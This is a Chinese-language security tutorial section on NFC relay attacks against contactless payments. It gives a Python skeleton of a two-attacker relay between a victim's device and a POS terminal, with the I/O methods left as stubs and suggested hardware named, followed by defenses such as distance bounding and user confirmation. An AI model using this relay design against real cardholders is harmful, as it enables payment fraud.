# NFC中继攻击实现

### 12.1 中继攻击技术实现

```python
# NFC中继攻击实现
# 攻击者A: 靠近受害者的设备
# 攻击者B: 靠近NFC终端
# A和B之间通过无线连接中继

import socket
import threading
import time

class NFCRelayAttacker:
    """NFC中继攻击框架"""

    def __init__(self):
        self.relay_delay = 0  # 中继延迟(毫秒)
        self.max_timeout = 5.0  # NFC协议超时(秒)

    def attacker_a_side(self, victim_device):
        """攻击者A: 与受害者设备交互"""
        # A需要模拟NFC终端(读卡器)
        # 启动ACR122U或Proxmark3模拟读卡器

        # 1. 检测到受害者设备进入NFC范围
        # (通过轮询检测)
        uid = victim_device.poll_nfc()

        if uid:
            print(f"[A] 检测到设备: {uid.hex()}")
            # 开始中继
            self._relay_a_to_b(uid)

    def attacker_b_side(self, pos_terminal):
        """攻击者B: 与POS终端交互"""
        # B需要模拟NFC卡(手机)
        # 启动Proxmark3或Android HCE模拟卡片

        # 1. 等待A侧连接
        # 2. 模拟卡片等待POS终端
        pos_terminal.poll_for_card()

        # 当POS终端发起交易:
        # APDU中继
        self._relay_b_to_a()

    def _relay_a_to_b(self, initial_data):
        """A侧 -> B侧 中继"""
        while True:
            # 接收受害者设备的响应
            response = self._receive_from_device()

            if response:
                start_time = time.time()

                # 通过网络发送给B
                self._send_to_b(response)

                # 等待B的响应(来自POS终端)
                pos_response = self._receive_from_b()

                # 计算总延迟
                relay_time = time.time() - start_time
                self.relay_delay = relay_time * 1000

                if relay_time > self.max_timeout:
                    print(f"[!] 中继超时: {relay_time:.3f}s")
                    print("[!] NFC协议可能超时,攻击可能失败")
                    break

                # 将POS终端的命令转发给受害者设备
                self._send_to_device(pos_response)

                print(f"[*] 中继延迟: {self.relay_delay:.1f}ms")

    def _relay_b_to_a(self):
        """B侧 -> A侧 中继"""
        while True:
            # 接收POS终端的APDU命令
            apdu = self._receive_from_pos()

            if apdu:
                # 发送给A侧(转发给受害者设备)
                self._send_to_a(apdu)

                # 等待A侧响应
                response = self._receive_from_a()

                # 将响应返回给POS终端
                self._send_to_pos(response)

    def _send_to_b(self, data):
        """通过无线网络发送给B"""
        # 使用蓝牙/WiFi/4G等
        # 需要低延迟连接
        pass

    def _receive_from_b(self):
        """从B接收数据"""
        pass

    def _send_to_a(self, data):
        """发送给A"""
        pass

    def _receive_from_a(self):
        """从A接收"""
        pass

    def _send_to_device(self, data):
        """发送给受害者设备"""
        pass

    def _receive_from_device(self):
        """从受害者设备接收"""
        pass

    def _send_to_pos(self, data):
        """发送给POS终端"""
        pass

    def _receive_from_pos(self):
        """从POS终端接收"""
        pass


class NFCRelayDefense:
    """NFC中继攻击防御"""

    @staticmethod
    def distance_bounding_protocol():
        """距离绑定协议"""
        return """
        距离绑定协议(Distance Bounding):

        原理: 通过测量信号往返时间(RTT)计算距离
        - 光速: ~30cm/ns
        - NFC范围: <10cm
        - 可接受RTT: <0.6ns(理论)

        协议步骤:
          1. 终端发送随机挑战(nonce)
          2. 卡片立即返回响应(最小处理延迟)
          3. 终端测量RTT
          4. 如果RTT > 阈值,拒绝交易

        实现挑战:
          - 需要纳秒级时间测量
          - 卡片处理延迟需要最小化
          - 需要专用硬件支持

        现有实现:
          - NXP MIFARE Plus: 有距离测量
          - 有些银行芯片支持
          - 标准NFC尚未普遍实现
        """

    @staticmethod
    def multi_factor_verification():
        """多因素验证防御"""
        return """
        多因素验证对抗中继攻击:

        1. 用户认证
           | 指纹/面部识别(手机侧)
           | PIN码输入
           | 即使中继成功,也需要用户确认

        2. 交易确认
           | 大额交易需屏幕确认
           | 显示交易金额和商户
           | 用户主动确认

        3. 行为分析
           | 交易时间(工作时间/异常时间)
           | 交易地点(与历史比较)
           | 交易金额(与习惯比较)

        4. 声音/震动提示
           | NFC交易时播放声音
           | 震动反馈
           | 提醒用户注意

        5. 会话超时
           | NFC会话有时间限制
           | 中继增加延迟
           | 超时会话自动终止
        """
```

---

---

## 📋 内容审核与补充建议

> 针对「NFC中继攻击实现」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
